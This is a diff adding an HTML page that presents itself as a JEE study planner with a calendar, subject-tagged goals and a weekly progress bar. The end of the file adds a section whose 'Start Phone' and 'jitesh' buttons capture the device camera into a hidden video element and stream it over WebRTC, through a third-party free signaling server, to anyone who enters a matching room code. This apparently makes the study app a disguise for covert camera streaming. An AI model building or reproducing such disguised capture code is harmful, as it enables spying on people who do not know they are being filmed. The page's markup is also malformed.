@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>My jee planner</title>
+</head>
+<style>
+    body {
+      font-family: Arial;
+      background: #ffffff;
+      text-align: center;
+    }
+
+    h1 {
+      color: #5a4fcf;
+    }
+
+    /* Calendar */
+    .calendar {
+      display: flex;
+      justify-content: center;
+      margin: 10px;
+    }
+
+    .day {
+      padding: 10px;
+      margin: 5px;
+      background: #e0e0ff;
+      border-radius: 15px;
+      width: 60px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .active {
+      background: linear-gradient(45deg,#5a4fcf,#7b6cff);
+      color: white;
+    }
+
+    /* Progress */
+    .progress {
+      width: 80%;
+      height: 10px;
+      background: #eee;
+      margin: auto;
+      border-radius: 10px;
+    }
+
+    .bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(45deg,#5a4fcf,#7b6cff);
+      border-radius: 10px;
+    }
+
+    /* Cards */
+    .goal-card {
+      background: #fafaff;
+      margin: 15px;
+      padding: 15px;
+      border-radius: 15px;
+      box-shadow: 0 3px 8px rgba(0,0,0,0.1);
+      text-align: left;
+    }
+
+    .subject {
+      border: 1px solid #5a4fcf;
+      color: #5a4fcf;
+      padding: 5px 12px;
+      border-radius: 20px;
+      display: inline-block;
+      margin-top: 5px;
+      font-size: 14px;
+    }
+
+    /* Buttons */
+    button {
+      padding: 10px;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(45deg,#5a4fcf,#7b6cff);
+      color: white;
+      cursor: pointer;
+      margin: 5px;
+    }
+
+    .fab {
+      position: fixed;
+      bottom: 20px;
+      width: 80%;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 16px;
+    }
+
+    /* Popup */
+    .popup {
+      display: none;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      background: white;
+      padding: 20px;
+      border-radius: 20px 20px 0 0;
+      box-shadow: 0 -3px 10px rgba(0,0,0,0.2);
+    }
+
+    textarea {
+      width: 90%;
+      padding: 12px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      margin-top: 10px;
+    }
+
+    .subjects span {
+      padding: 8px 15px;
+      border: 1px solid #ccc;
+      margin: 5px;
+      border-radius: 20px;
+      cursor: pointer;
+      display: inline-block;
+    }
+
+    .selected {
+      background: linear-gradient(45deg,#5a4fcf,#7b6cff);
+      color: white;
+      border: none;
+    }
+
+    /* Text highlight */
+    #percent {
+      color: #5a4fcf;
+      font-weight: bold;
+    }
+  </style>
+</head>
+
+<body>
+
+<h1>જીતેશ પ્રો પ્લાનર</h1>
+
+<h3>This Week Progress</h3>
+<div class="progress">
+  <div class="bar" id="bar"></div>
+</div>
+<p id="percent">0%</p>
+
+<div>
+  <button onclick="changeWeek(-7)">⬅️</button>
+  <button onclick="changeWeek(7)">➡️</button>
+</div>
+
+<div class="calendar" id="calendar"></div>
+
+<div id="goalList"></div>
+
+<button class="fab" onclick="openPopup()">+ Add New Goal</button>
+
+<!-- Popup -->
+<div class="popup" id="popup">
+  <h3 style="color:#5a4fcf;">Add Goal</h3>
+
+  <textarea id="goalText" placeholder="Type here..."></textarea>
+
+  <h4>Select Subject</h4>
+  <div class="subjects">
+    <span onclick="selectSubject(this)">Physics</span>
+    <span onclick="selectSubject(this)">Chemistry</span>
+    <span onclick="selectSubject(this)">Maths</span>
+    <span onclick="selectSubject(this)">English</span>
+    <span onclick="selectSubject(this)">Computer</span>
+  </div>
+
+  <br>
+  <button onclick="saveGoal()">Add</button>
+  <button onclick="closePopup()">Close</button>
+</div>
+
+<script>
+let currentDate = new Date();
+let selectedDate = new Date();
+let selectedSubject = "";
+
+function loadCalendar() {
+  let cal = document.getElementById("calendar");
+  cal.innerHTML = "";
+
+  let start = new Date(currentDate);
+  start.setDate(start.getDate() - start.getDay());
+
+  for (let i = 0; i < 7; i++) {
+    let d = new Date(start);
+    d.setDate(start.getDate() + i);
+
+    let div = document.createElement("div");
+    div.className = "day";
+    div.innerHTML = d.getDate();
+
+    div.onclick = () => {
+      selectedDate = d;
+      loadCalendar();
+      loadGoals();
+    };
+
+    if (d.toDateString() === selectedDate.toDateString()) {
+      div.classList.add("active");
+    }
+
+    cal.appendChild(div);
+  }
+}
+
+function changeWeek(val) {
+  currentDate.setDate(currentDate.getDate() + val);
+  loadCalendar();
+}
+
+function getKey(date) {
+  return date.toDateString();
+}
+
+function saveGoal() {
+  let text = document.getElementById("goalText").value;
+  if (text === "" || selectedSubject === "") return;
+
+  let data = JSON.parse(localStorage.getItem(getKey(selectedDate))) || [];
+
+  data.push({ text, subject: selectedSubject, done: false });
+
+  localStorage.setItem(getKey(selectedDate), JSON.stringify(data));
+
+  document.getElementById("goalText").value = "";
+  closePopup();
+  loadGoals();
+}
+
+function loadGoals() {
+  let data = JSON.parse(localStorage.getItem(getKey(selectedDate))) || [];
+  let box = document.getElementById("goalList");
+  box.innerHTML = "";
+
+  data.forEach((g, i) => {
+    let div = document.createElement("div");
+    div.className = "goal-card";
+
+    let check = document.createElement("input");
+    check.type = "checkbox";
+    check.checked = g.done;
+
+    check.onchange = () => {
+      data[i].done = check.checked;
+      localStorage.setItem(getKey(selectedDate), JSON.stringify(data));
+      updateProgress();
+    };
+
+    let text = document.createElement("h3");
+    text.innerText = g.text;
+
+    let sub = document.createElement("div");
+    sub.className = "subject";
+    sub.innerText = g.subject;
+
+    let del = document.createElement("span");
+    del.innerText = " ❌";
+    del.onclick = () => {
+      data.splice(i,1);
+      localStorage.setItem(getKey(selectedDate), JSON.stringify(data));
+      loadGoals();
+    };
+
+    let edit = document.createElement("span");
+    edit.innerText = " ✏️";
+    edit.onclick = () => {
+      let newText = prompt("Edit goal", g.text);
+      if(newText){
+        data[i].text = newText;
+        localStorage.setItem(getKey(selectedDate), JSON.stringify(data));
+        loadGoals();
+      }
+    };
+
+    div.appendChild(check);
+    div.appendChild(text);
+    div.appendChild(sub);
+    div.appendChild(edit);
+    div.appendChild(del);
+
+    box.appendChild(div);
+  });
+
+  updateProgress();
+}
+
+function updateProgress() {
+  let start = new Date(currentDate);
+  start.setDate(start.getDate() - start.getDay());
+
+  let total = 0;
+  let done = 0;
+
+  for (let i = 0; i < 7; i++) {
+    let d = new Date(start);
+    d.setDate(start.getDate() + i);
+
+    let data = JSON.parse(localStorage.getItem(getKey(d))) || [];
+
+    total += data.length;
+    done += data.filter(g => g.done).length;
+  }
+
+  let percent = total === 0 ? 0 : Math.round((done/total)*100);
+
+  document.getElementById("bar").style.width = percent + "%";
+  document.getElementById("percent").innerText = percent + "%";
+}
+
+function openPopup() {
+  document.getElementById("popup").style.display = "block";
+}
+
+function closePopup() {
+  document.getElementById("popup").style.display = "none";
+}
+
+function selectSubject(el) {
+  document.querySelectorAll(".subjects span").forEach(s => s.classList.remove("selected"));
+  el.classList.add("selected");
+  selectedSubject = el.innerText;
+}
+
+loadCalendar();
+loadGoals();
+</script>
+<body>
+
+<h2> My jee planner</h2>
+
+<input id="room" placeholder="Enter rcode">
+<button onclick="startCamera()">Start Phone</button>
+<button onclick="watchCamera()">jitesh</button>
+
+<br><br>
+<video id="video" autoplay playsinline width="300" style="display:none;"></video>
+
+<script src="https://cdn.jsdelivr.net/npm/simple-peer@9/simplepeer.min.js"></script>
+
+<script src="https://unpkg.com/socket.io-client@4.0.1/dist/socket.io.min.js"></script>
+
+<script>
+const socket = io("https://socketio-chat-h9jt.herokuapp.com/"); // free signaling server
+
+let peer;
+
+function startCamera() {
+  const room = document.getElementById("room").value;
+
+  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+  .then(stream => {
+    document.getElementById("video").srcObject = stream;
+
+    peer = new SimplePeer({ initiator: true, trickle: false, stream: stream });
+
+    peer.on('signal', data => {
+      socket.emit('join', { room: room, data: data });
+    });
+
+    socket.on('signal', data => {
+      peer.signal(data);
+    });
+  });
+}
+
+function watchCamera() {
+  const room = document.getElementById("room").value;
+
+  peer = new SimplePeer({ initiator: false, trickle: false });
+
+  peer.on('signal', data => {
+    socket.emit('join', { room: room, data: data });
+  });
+
+  socket.on('signal', data => {
+    peer.signal(data);
+  });
+
+  peer.on('stream', stream => {
+    document.getElementById("video").srcObject = stream;
+  });
+}
+</script>
+
+</body>
+</html>
